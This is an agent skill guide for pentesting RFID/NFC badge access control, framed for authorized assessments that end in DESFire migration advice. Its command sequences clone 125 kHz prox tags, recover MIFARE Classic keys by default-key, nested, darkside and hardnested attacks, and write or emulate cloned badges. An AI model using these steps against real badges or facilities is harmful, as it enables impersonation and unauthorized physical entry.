---
name: assessing-rfid-and-nfc-access-control-systems
description: Assess 125 kHz and 13.56 MHz RFID/NFC badge access-control systems for cloneability by reading and cloning low-frequency tags and MIFARE Classic cards via default-key, darkside, nested, and hardnested key-recovery attacks, then recommend migration to DESFire EV2/EV3 with diversified keys.
domain: cybersecurity
subdomain: wireless-security
tags:
- wireless-security
- rfid
- nfc
- mifare-classic
- proxmark3
- access-control
- card-cloning
- desfire
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.AA-01
- PR.AA-06
- ID.RA-01
- DE.CM-01
mitre_attack:
- T1200
- T1078
- T1557
- T1110
---
# Assessing RFID and NFC Access Control Systems

> **Authorized Use Only:** Reading, cloning, or emulating access-control credentials lets you impersonate a badge holder and enter physical premises. Perform these techniques only against cards, readers, and facilities you own or are explicitly authorized in writing to assess, and only with badges issued to you or provided for the engagement. Cloning someone else's badge or entering a controlled area without authorization is trespass, fraud, and a computer-misuse offence in most jurisdictions.

## Overview

Physical access control still relies overwhelmingly on two RFID/NFC technologies, both of which have well-understood weaknesses. **Low-frequency (125 kHz)** credentials — HID Prox, EM4100/EM4102, Indala — typically transmit a fixed facility-code/card-number with **no cryptography and no authentication at all**; any reader in range can capture the ID and any writable T5577 tag can replay it. **High-frequency (13.56 MHz)** **MIFARE Classic** cards use NXP's proprietary CRYPTO1 cipher, which has been broken since 2008: weak random-number generation, a flawed authentication protocol, and a short 48-bit key make full key recovery practical in seconds-to-minutes. Recovering the badge contents and writing them to a blank is **Hardware Additions (T1200)** of a cloned credential that yields a **Valid Account (T1078)** at the physical boundary.

The MIFARE Classic attack toolbox is well established: a **default-key** check (huge numbers of deployments still use factory keys like `FFFFFFFFFFFF` or known vendor keys) often reveals every sector immediately; the **darkside** attack (`mfcuk`) recovers a first key from a card with no known keys by exploiting CRYPTO1 nonce weaknesses; the **nested** attack (`mfoc`) leverages one known key to recover all the others; and **hardnested** defeats the "hardened" MIFARE Classic EV1 cards with improved RNG. A reader that accepts both modern and legacy credentials enables a **downgrade**, and capturing the over-the-air exchange to recover keys is an **Adversary-in-the-Middle (T1557)**/**Brute Force (T1110)** problem. Once keys are recovered, the dump is written to a "magic" UID-changeable card or emulated by a Proxmark3 or Flipper Zero.

The defensive recommendation is consistent: migrate to **MIFARE DESFire EV2/EV3** (or SEOS), which use AES-128 with mutual authentication, **diversified per-card keys** derived from a master key and the card UID, and secure messaging — eliminating the static-key, weak-cipher exposures of LF prox and MIFARE Classic. This skill produces a cloneability assessment per credential and a prioritized migration recommendation, mapping to NIST CSF identity controls PR.AA-01 (identities/credentials managed) and PR.AA-06 (physical access managed).

## When to Use

- When auditing a building or campus physical access-control system (PACS) for credential cloneability.
- When a client still issues 125 kHz prox or MIFARE Classic badges and needs a risk-based migration case.
- When validating that "secure" badges actually use DESFire AES with diversified keys, not Classic emulation.
- When performing a red-team or physical-pentest engagement scoped to badge cloning.
- When testing whether a reader accepts legacy/downgraded credential types.
- When evaluating new badge stock or a vendor's credential issuance process.

## Prerequisites

- A **Proxmark3** (RDV4, Easy, or compatible) running the Iceman/RRG firmware — the reference tool for LF and HF assessment.
- `libnfc`-compatible reader (e.g. ACR122U) for `mfoc`/`mfcuk`, and optionally a **Flipper Zero** for field reads.
- Blank/writable tags for cloning tests you control: **T5577** (LF), **"magic" Gen1a/Gen2 MIFARE Classic** (HF UID-changeable).
- Tooling:
  ```bash
  # Proxmark3 Iceman client
  git clone https://github.com/RfidResearchGroup/proxmark3.git
  # libnfc + MIFARE Classic key-recovery tools
  sudo apt update
  sudo apt install -y libnfc-bin libnfc-examples mfoc mfcuk
  ```
- A documented set of badges issued for testing and written authorization for the facility/readers.

## Objectives

- Identify the technology and chip of each credential (LF vs HF, EM/HID/Indala vs MIFARE Classic/DESFire).
- Attempt key recovery on MIFARE Classic via default-key, nested, darkside, and hardnested attacks.
- Read/dump credential contents and demonstrate clone feasibility onto a blank you control.
- Test whether the reader accepts cloned/legacy/downgraded credentials.
- Score each credential's cloneability and produce a DESFire-migration recommendation.
- Validate a hardened DESFire EV2/EV3 deployment resists default-key and key-recovery attempts.

## MITRE ATT&CK Mapping

| ID | Name | Tactic | Where it shows up |
|----|------|--------|-------------------|
| T1200 | Hardware Additions | Initial Access | A cloned/magic card or emulator presented to a physical reader |
| T1078 | Valid Accounts | Initial Access / Defense Evasion | A working badge clone grants legitimate physical access |
| T1557 | Adversary-in-the-Middle | Credential Access | Capturing/relaying the reader-card exchange to recover keys |
| T1110 | Brute Force | Credential Access | Key recovery / default-key trials against CRYPTO1 keys |

## Workflow

### 1. Identify the credential technology
Determine LF vs HF and the specific chip before choosing an attack. The Proxmark3 search commands fingerprint the tag; a credential that answers `hf search` as MIFARE Classic is in scope for CRYPTO1 attacks, while DESFire/SEOS will report AES.

```bash
# In the Proxmark3 Iceman client (pm3):
pm3 --> lf search          # 125 kHz: EM4100 / HID Prox / Indala detection
pm3 --> hf search          # 13.56 MHz: ISO14443A, MIFARE Classic/DESFire ID
pm3 --> hf 14a info        # ATQA/SAK/UID -> chip type (Classic 1K/4K vs DESFire)
```

### 2. Read and clone a low-frequency (125 kHz) credential
LF prox has no authentication, so a read-then-write to a T5577 is a complete clone. This demonstrates that any unauthenticated proximity credential is trivially cloneable.

```bash
pm3 --> lf hid read        # capture HID Prox facility code + card number
pm3 --> lf em 410x reader  # or capture an EM4100 ID
# Clone the captured ID onto a writable T5577 blank you control:
pm3 --> lf hid clone -w H10301 --fc 123 --cn 4567
pm3 --> lf em 410x clone --id 1234567890
```

### 3. Recover MIFARE Classic keys (default → nested → darkside → hardnested)
Escalate through the attack chain. Start with default keys; if any sector key is known, use the nested attack to get the rest; if none are known, use darkside; for hardened EV1 cards, use hardnested.

```bash
# (a) default keys / dictionary check with the Proxmark3
pm3 --> hf mf chk *1 ? d mfc_default_keys
# (b) nested attack (uses one known key to recover all) — Proxmark3 autopwn:
pm3 --> hf mf autopwn
# (c) libnfc path: nested (mfoc) then darkside (mfcuk) for an unknown first key
mfoc -O card_dump.mfd                 # nested; writes a full sector dump
mfcuk -C -R 0:A -s 250 -S 250         # darkside: recover one key from a fresh card
# (d) hardnested for hardened cards (Proxmark3):
pm3 --> hf mf hardnested 0 A FFFFFFFFFFFF 4 A
```

### 4. Dump, analyze, and assess cloneability
Once keys are known, dump all sectors and feed the dump to the companion script, which reports chip type, how many sectors opened under default keys, the recovery method needed, and a cloneability score.

```bash
pm3 --> hf mf dump            # writes hf-mf-<UID>-dump.bin / .json
python3 scripts/agent.py assess --dump hf-mf-UID-dump.json \
        --keys recovered_keys.txt --json cloneability.json
```

### 5. Demonstrate the clone and test the reader
Write the recovered dump to a magic card (or emulate it) and present it to the reader to prove end-to-end impact. Also test whether the reader still accepts LF prox or MIFARE Classic when a DESFire rollout is "in progress" (a downgrade gap).

```bash
# Write dump to a Gen1a "magic" MIFARE Classic blank you own:
pm3 --> hf mf cload -f hf-mf-UID-dump.bin
# Or emulate the card directly from the Proxmark3:
pm3 --> hf mf sim --1k -u 11223344
# Present to the test reader; log whether access is granted (downgrade check).
```

### 6. Recommend and validate DESFire hardening
Produce the migration recommendation: DESFire EV2/EV3 with AES-128, diversified per-card keys (UID-derived), and disabling legacy credential acceptance at the reader. Validate by confirming the new credential reports AES and resists default-key/key-recovery attempts.

```bash
# Confirm a DESFire card uses AES app keys (not default) and mutual auth:
pm3 --> hf mfdes info
pm3 --> hf mfdes auth --aid 000001 --kn 0 --algo AES --key 00000000000000000000000000000000
#   ^ default-key auth MUST fail on a properly provisioned DESFire app.
```

## Tools and Resources

| Resource | Link |
|----------|------|
| Proxmark3 Iceman / RRG firmware + client | https://github.com/RfidResearchGroup/proxmark3 |
| libnfc | https://github.com/nfc-tools/libnfc |
| mfoc (nested MIFARE Classic) | https://github.com/nfc-tools/mfoc |
| mfcuk (darkside MIFARE Classic) | https://github.com/nfc-tools/mfcuk |
| Flipper Zero docs | https://docs.flipper.net/ |
| NXP MIFARE DESFire EV3 product page | https://www.nxp.com/products/MF3DHX3 |
| NIST SP 800-116 — PIV in PACS | https://csrc.nist.gov/pubs/sp/800/116/r1/final |

## Credential Cloneability Cheat-Sheet

| Credential | Crypto | Attack | Cloneability | Recommendation |
|------------|--------|--------|--------------|----------------|
| EM4100 / EM4102 (125 kHz) | None | Read + write T5577 | Trivial | Retire LF |
| HID Prox / Indala (125 kHz) | None (fixed ID) | Read + write T5577 | Trivial | Retire LF |
| MIFARE Classic 1K/4K | CRYPTO1 (48-bit) | default / nested / darkside | High | Migrate to DESFire |
| MIFARE Classic EV1 (hardened) | CRYPTO1 + better RNG | hardnested | Medium-High | Migrate to DESFire |
| MIFARE DESFire EV1 | AES/3DES | None practical (if non-default keys) | Low | OK; prefer EV2/EV3 |
| MIFARE DESFire EV2/EV3 | AES-128 + diversified keys | None practical | Very Low | Target state |

## Validation Criteria

- [ ] Each credential's frequency and chip type identified (LF/HF, EM/HID/Classic/DESFire).
- [ ] LF credential read and clone-to-T5577 demonstrated (or shown N/A).
- [ ] MIFARE Classic key recovery attempted across default/nested/darkside/hardnested.
- [ ] Full sector dump captured and cloneability scored per credential.
- [ ] Clone written to a magic card / emulated and tested against the reader.
- [ ] Reader downgrade behavior (accepts legacy credentials) tested.
- [ ] DESFire EV2/EV3 + diversified-key migration recommendation documented.
- [ ] Hardened DESFire credential validated to reject default-key authentication.
